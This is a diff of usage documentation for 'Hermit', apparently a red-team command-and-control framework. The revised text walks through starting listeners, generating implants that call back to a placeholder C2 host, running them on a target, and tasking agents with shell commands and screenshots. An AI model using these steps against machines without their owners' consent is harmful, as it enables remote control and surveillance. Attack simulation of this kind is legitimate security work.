@@ -5,15 +5,16 @@ date = 2024-01-02
 toc=true
 +++
 
-## Run (Connect to C2 Server)
+## Run (Connect to the C2 Server)
 
-First of all, execute `hermit client` command to connect the C2 server. Of course the C2 server needs to be running before that.
+At first, make sure that [the C2 server](./c2-server) has already started. It's running on the port `9999` by default.  
+Now run the `client` command to connect the C2 server.  
 
 ```sh
-Hermit $ hermit client -H my-c2-server.com -P 9999
+hermit client -H my-c2-server.com -P 9999
 ```
 
-After connecting, the console will start.
+After connecting, the client console will start.
 
 <br />
 
@@ -27,26 +28,41 @@ Hermit $ help
 
 ## Listener
 
-### Add New Listener
+### 1. Add New Listener
+
+Hermit currently supports the `HTTPS` listener only.  
+You need to specify the domains (`-d`) for HTTPS self-signed certificates.
 
 ```sh
-Hermit $ listener add -H my-c2-server.com -P 8000
+Hermit $ listener add -d localhost,my-c2-server.com
 ```
 
-Once the listener is added successfully, we can see it with `listeners` (or `listener list`) command.
+Once the listener is added successfully, you can see it with the `listeners` (or `listener list`) command.
 
 ```sh
 Hermit $ listeners
 ```
 
-<br />
+### 2. Start Listener
 
-### Start Listener
-
-After adding a listener as the previous section, we can start it by `listener start <ID or Name>` command.
+After adding a listener as the previous section, you can start it by the `listener start <ID or Name>` command.
 
 ```sh
 Hermit $ listener start 1
+```
+
+### 3. Stop Listener
+
+```sh
+Hermit $ listener stop 1
+```
+
+### 4. Delete Listener
+
+Listeners that you don't plan to use can be deleted using the `delete` command.
+
+```sh
+Hermit $ listener delete 1
 ```
 
 <br />
@@ -55,25 +71,26 @@ Hermit $ listener start 1
 
 ### Generate Implant
 
-We can generate implants with `implant gen` command with specifying a listener URL.
+You can generate implants with `implant gen` command with specifying the listener URL (`-l`) that you've started the previous section. The agent will connect to this listener URL.
 
 ```sh
-Hermit $ implant gen -l http://my-c2-server.com:8000/
+Hermit $ implant gen -l https://my-c2-server.com:4443/
 ```
 
-After generating, we can see it by `implants` (or `implant list`) command.
+After generating, you can see the information by `implants` (or `implant list`) command.
 
 ```sh
 Hermit $ implants
 ```
 
-After that, we need to transfer the implant to target computer and execute it.
+Now you need to transfer this implant to the target computer and execute it.
 
 <br />
 
 ## Agent
 
-When the agent has been registered by executing the implant, we can see it with `agents` (or `agent list`) command.
+When the implant is executed, the agent will start and attempt to connect to your C2 server's listener.  
+If it succeeds, the agent has been registered in the C2 server. You can check if the agent has been registered correctly with the `agents` (or `agent list`) command.
 
 ```sh
 Hermit $ agents
@@ -81,39 +98,47 @@ Hermit $ agents
 
 <br />
 
-### Interact with Agent
+### 1. Interact with Agent
 
-To interact with a specific agent for attacking, we can run `agent use <ID or Name>` command.
+To interact with the agent for the attack simulation, you can run the `agent use <ID or Name>` command.
 
 ```sh
-Hermit $ agent use 0
+Hermit $ agent use 1
 ```
 
-This command switches to the specified agent mode.
+This command switches to the agent mode.
 
 <br />
 
-### Agent Mode: Send Task
+### 2. Agent Mode: Send Tasks
 
-After entering the agent mode, we can simulate various attack method e.g. shell command, screenshot, etc.  
+After entering the agent mode, you can simulate various attack methods e.g. shell command, screenshot, etc. Other commands are currently under development.
 
 - **Shell Command**
 
 ```sh
-Hermit [agent: agent_0123456] $ shell whoami
+Hermit [agent: agent_0123] $ shell whoami
 ```
 
 - **Screenshot**
 
 ```sh
-Hermit [agetn: agent_0123456] $ shell whoami
+Hermit [agetn: agent_0123] $ screenshot
+```
+
+### 3. Quit Agent Mode
+
+To quit the agent mode and return the home console, run the `exit` command.
+
+```sh
+Hermit [agetn: agent_0123] $ exit
 ```
 
 <br />
 
 ## Exit
 
-To quit the console, run `exit` command.
+To quit the client console, run the `exit` command.
 
 ```sh
 Hermit $ exit
